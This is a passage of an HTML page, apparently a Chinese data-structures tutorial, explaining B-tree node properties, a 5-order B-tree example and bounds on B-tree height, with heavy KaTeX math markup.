<th style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">P_{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></th>
</tr>
</thead>
</table>
<p>其中，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>i</mi><mo>=</mo><mi>l</mi><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">K_{i} (i = l, 2, \dotsc, n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 为结点的关键字，且满足 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mn>1</mn></msub><mo>&lt;</mo><msub><mi>K</mi><mn>2</mn></msub><mo>&lt;</mo><mo>…</mo><mo>&lt;</mo><msub><mi>K</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">K_{1} &lt; K_{2} &lt; \dotsc &lt; K_{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>；<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>i</mi><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P_{i} (i = 0, 1, \dotsc, n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 为指向子树根结点的指针，且指针 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">P_{i-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span> 所指子树中所有结点的关键字均小于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">K_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">P_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 所指子树中所有结点的关键字均大于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">K_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo stretchy="false">(</mo><mo stretchy="false">⌈</mo><mi>m</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌉</mo><mo>−</mo><mn>1</mn><mo>⩽</mo><mi>n</mi><mo>⩽</mo><mi>m</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n(\lceil m / 2 \rceil - 1 \leqslant n \leqslant m - 1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mopen">(⌈</span><span class="mord mathnormal">m</span><span class="mord">/2</span><span class="mclose">⌉</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7811em;vertical-align:-0.1367em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7733em;vertical-align:-0.1367em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span> 为结点中关键字的个数。</p>
</li>
<li>
<p>所有的叶结点都出现在同一层次上，并且不带信息（可以视为外部结点或类似于折半查找判定树的查找失败结点，实际上这些结点不存在，指向这些结点的指针为空）。</p>
</li>
</ol>
<p>下图所示为一棵 <code>5</code> 阶 B 树，可以借助该实例来分析上述性质：</p>
<figure><figcaption>一棵 5 阶 B 树</figcaption></figure>
<ol>
<li>
<p>结点的孩子个数等于该结点中关键字个数加 <code>1</code></p>
</li>
<li>
<p>如果根结点没有关键字就没有子树，此时 B 树为空；如果根结点有关键字，则其子树个数必然大于或等于 <code>2</code>，因为子树个数等于关键字个数加 <code>1</code></p>
</li>
<li>
<p>除根结点外的所有非叶结点至少有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mi>m</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌉</mo><mo>=</mo><mo stretchy="false">⌈</mo><mn>5</mn><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌉</mo><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">\lceil m / 2 \rceil = \lceil 5 / 2 \rceil = 3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal">m</span><span class="mord">/2</span><span class="mclose">⌉</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord">5/2</span><span class="mclose">⌉</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span> 棵子树（即至少有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mi>m</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌉</mo><mo>−</mo><mn>1</mn><mo>=</mo><mo stretchy="false">⌈</mo><mn>5</mn><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌉</mo><mo>−</mo><mn>1</mn><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">\lceil m / 2 \rceil - 1 = \lceil 5 / 2 \rceil - 1 = 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal">m</span><span class="mord">/2</span><span class="mclose">⌉</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord">5/2</span><span class="mclose">⌉</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span> 个关键字）；至多有 <code>5</code> 棵子树（即至多有 <code>4</code> 个关键字）</p>
</li>
<li>
<p>结点中的关键字从左到右递增有序，关键字两侧均有指向子树的指针，左侧指针所指子树的所有关键字均小于该关键字，右侧指针所指子树的所有关键字均大于该关键字。或者看成下层结点的关键字总是落在由上层结点的关键字所划分的区间内，如第二层最左结点的关键字划分成了 <code>3</code> 个区间：<code>(-∞, 5)</code>、<code>（5, 11）</code>、<code>（11, +∞）</code>,该结点中的 <code>3</code> 个指针所指子树的关键字均分别落在这 <code>3</code> 个区间内</p>
</li>
<li>
<p>所有叶结点均在第 <code>4</code> 层，代表查找失败的位置</p>
</li>
<li>
<p><strong>B 树的高度（磁盘存取次数）</strong></p>
<p>B 树中的大部分操作所需的磁盘存取次数与 B 树的高度成正比。分析 B 树在不同情况下的高度。当然，首先应该明确 B 树的高度不包括最后的不带任何信息的叶结点所处的那一层。</p>
<p>若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>⩾</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n \geqslant 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733em;vertical-align:-0.1367em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩾</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，则对任意一棵包含 <code>n</code> 个关键字、高度为 <code>h</code>、阶数为 <code>m</code> 的 B 树：</p>
<ul>
<li>因为 B 树中每个结点最多有 <code>m</code> 棵子树，<code>m - 1</code> 个关键字，所以在一棵高度为 <code>h</code> 的 <code>m</code> 阶 B 树中关键字的个数应满足 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>⩽</mo><mo stretchy="false">(</mo><mi>m</mi><mo>−</mo><mi>l</mi><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>l</mi><mo>+</mo><mi>m</mi><mo>+</mo><msup><mi>m</mi><mn>2</mn></msup><mo>+</mo><mo>…</mo><mo>+</mo><msup><mi>m</mi><mrow><mi>h</mi><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">)</mo><mo>=</mo><msup><mi>m</mi><mi>h</mi></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n \leqslant (m - l)(l + m + m^{2}+ \dotsc + m^{h-1}) = m^{h} - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733em;vertical-align:-0.1367em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">h</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9324em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">h</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，因此有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo>⩾</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>m</mi></msub><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">h \geqslant log_{m} (n + 1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8311em;vertical-align:-0.1367em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩾</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></li>
<li>若让每个结点中的关键字个数达到最少，则容纳同样多关键字的 B 树的高度达到最大。第一层至少有 <code>1</code> 个结点；第二层至少有 <code>2</code> 个结；除根结点外的每个非叶结点至少有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mi>m</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil m / 2 \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal">m</span><span class="mord">/2</span><span class="mclose">⌉</span></span></span></span> 棵子树，则第三层至少有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo stretchy="false">⌈</mo><mi>m</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">2 \lceil m / 2 \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mopen">⌈</span><span class="mord mathnormal">m</span><span class="mord">/2</span><span class="mclose">⌉</span></span></span></span> 个结点……第 <code>h + 1</code> 层至少有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo stretchy="false">(</mo><mo stretchy="false">⌈</mo><mi>m</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌉</mo><msup><mo stretchy="false">)</mo><mrow><mi>h</mi><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">2(\lceil m / 2 \rceil)^{h-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mopen">(⌈</span><span class="mord mathnormal">m</span><span class="mord">/2</span><span class="mclose">⌉</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">h</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span> 个结点，注意到第 <code>h + 1</code> 层是不包含任何信息的叶结点。对于关键字个数为 <code>n</code> 的 B 树，叶结点即查找不成功的结点为 <code>n + 1</code>，由此有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>+</mo><mi>l</mi><mo>⩾</mo><mn>2</mn><mo stretchy="false">(</mo><mo stretchy="false">⌈</mo><mi>m</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌉</mo><msup><mo stretchy="false">)</mo><mrow><mi>h</mi><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">n + l \geqslant 2(\lceil m / 2 \rceil)^{h-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8311em;vertical-align:-0.1367em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩾</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mopen">(⌈</span><span class="mord mathnormal">m</span><span class="mord">/2</span><span class="mclose">⌉</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">h</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>，即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo>⩽</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mrow><mo stretchy="false">⌈</mo><mi>m</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌉</mo></mrow></msub><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">h \leqslant log_{\lceil m / 2 \rceil} ((n + 1) / 2) + 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8311em;vertical-align:-0.1367em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1052em;vertical-align:-0.3552em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">⌈</span><span class="mord mathnormal mtight">m</span><span class="mord mtight">/2</span><span class="mclose mtight">⌉</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span><span 